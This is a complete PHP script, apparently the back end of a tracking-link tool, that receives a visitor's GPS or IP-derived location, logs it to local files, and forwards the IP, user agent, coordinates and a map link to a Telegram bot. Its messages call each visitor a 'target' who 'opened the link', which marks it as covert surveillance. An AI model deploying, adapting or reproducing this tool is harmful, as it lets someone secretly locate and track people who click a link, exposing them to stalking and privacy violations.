<?php
/**
 * Location Submit - Receives GPS or IP geolocation from client
 * Saves to geolocations.json and sends to Telegram
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

require_once 'geo.php';

// Get client IP
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = trim($_SERVER['HTTP_CLIENT_IP']);
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
}

$source = $_POST['source'] ?? '';
$latitude = isset($_POST['latitude']) ? floatval($_POST['latitude']) : null;
$longitude = isset($_POST['longitude']) ? floatval($_POST['longitude']) : null;

$geo = null;

if ($source === 'gps' && $latitude !== null && $longitude !== null) {
    // GPS coordinates from device hardware
    $geo = [
        'status' => 'success',
        'ip' => $ip,
        'latitude' => $latitude,
        'longitude' => $longitude,
        'source' => 'gps',
        'city' => 'GPS Location',
        'regionName' => 'Device',
        'country' => 'Device GPS',
        'countryCode' => '',
        'location' => "GPS: {$latitude}, {$longitude}",
        'isp' => 'Device GPS',
        'timezone' => 'Unknown'
    ];
} elseif ($source === 'ip') {
    // Fallback: IP geolocation
    $geo = getIPLocation($ip);
    if ($geo && isset($geo['status']) && $geo['status'] === 'success') {
        $geo['source'] = 'ip';
    }
}

if (!$geo || !isset($geo['status']) || $geo['status'] !== 'success') {
    echo json_encode(['status' => 'error', 'message' => 'Invalid or missing location data']);
    exit;
}

// Save to geolocations.json
$entry = [
    'ip' => $ip,
    'timestamp' => date('Y-m-d H:i:s'),
    'geo' => $geo
];

$file = 'geolocations.json';
$data = [];
if (file_exists($file)) {
    $content = @file_get_contents($file);
    if ($content !== false) {
        $data = json_decode($content, true) ?: [];
    }
}
$data[] = $entry;
@file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));

// Display location to terminal
$sourceLabel = ($geo['source'] ?? '') === 'gps' ? 'GPS (Device)' : 'IP Geolocation';
$locationDisplay = "\n" . str_repeat('=', 50) . "\n";
$locationDisplay .= "📍 New Target Opened the Link\n";
$locationDisplay .= str_repeat('-', 50) . "\n";
$locationDisplay .= "Source: " . $sourceLabel . "\n";
$locationDisplay .= "IP: " . $ip . "\n";
$locationDisplay .= "Latitude: " . ($geo['latitude'] ?? 'N/A') . "\n";
$locationDisplay .= "Longitude: " . ($geo['longitude'] ?? 'N/A') . "\n";
if (isset($geo['city']) && $geo['city'] !== 'GPS Location') {
    $locationDisplay .= "Location: " . ($geo['location'] ?? $geo['city']) . "\n";
}
if (!empty($geo['isp']) && $geo['isp'] !== 'Device GPS') {
    $locationDisplay .= "ISP: " . $geo['isp'] . "\n";
}
$locationDisplay .= "Time: " . date('Y-m-d H:i:s') . "\n";
$locationDisplay .= str_repeat('=', 50) . "\n";
if (defined('STDERR') && is_resource(STDERR)) {
    @fwrite(STDERR, $locationDisplay);
}
error_log(trim($locationDisplay));
@file_put_contents('location.log', $locationDisplay . "\n", FILE_APPEND | LOCK_EX);
@file_put_contents('location_notify.txt', $locationDisplay, LOCK_EX);

// Send to Telegram
$telegram_token = '';
$telegram_chat = '';
$config_file = 'telegram_config.json';

if (file_exists($config_file)) {
    $config_content = file_get_contents($config_file);
    $config = json_decode($config_content, true);
    if ($config && isset($config['bot_token']) && isset($config['chat_id'])) {
        $telegram_token = $config['bot_token'];
        $telegram_chat = $config['chat_id'];
    }
}

if (!empty($telegram_token) && !empty($telegram_chat)) {
    $sourceLabel = ($geo['source'] ?? '') === 'gps' ? 'GPS (Device)' : 'IP Geolocation';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $message = "📍 *New Target Opened the Link*\n\n";
    $message .= "🔗 *Source:* " . $sourceLabel . "\n";
    $message .= "🌐 *IP:* " . $ip . "\n";
    $message .= "📱 *User Agent:* " . htmlspecialchars($userAgent, ENT_QUOTES, 'UTF-8') . "\n";
    $message .= "⏰ *Time:* " . date('Y-m-d H:i:s') . "\n";

    if (!empty($geo['latitude']) && !empty($geo['longitude'])) {
        $mapUrl = "https://www.google.com/maps?q={$geo['latitude']},{$geo['longitude']}";
        $message .= "🗺️ [View on Map]($mapUrl)\n";
    }
    if (isset($geo['city']) && $geo['city'] !== 'GPS Location') {
        $message .= "📍 *Location:* " . ($geo['location'] ?? $geo['city']) . "\n";
    }
    if (!empty($geo['isp']) && $geo['isp'] !== 'Device GPS') {
        $message .= "🌐 *ISP:* " . $geo['isp'] . "\n";
    }

    $url = "https://api.telegram.org/bot" . $telegram_token . "/sendMessage";
    $data = [
        'chat_id' => $telegram_chat,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
        curl_setopt($ch, CURLOPT_TIMEOUT, 12);
        @curl_exec($ch);
        curl_close($ch);
    }
}

echo json_encode(['status' => 'success', 'message' => 'Location saved']);
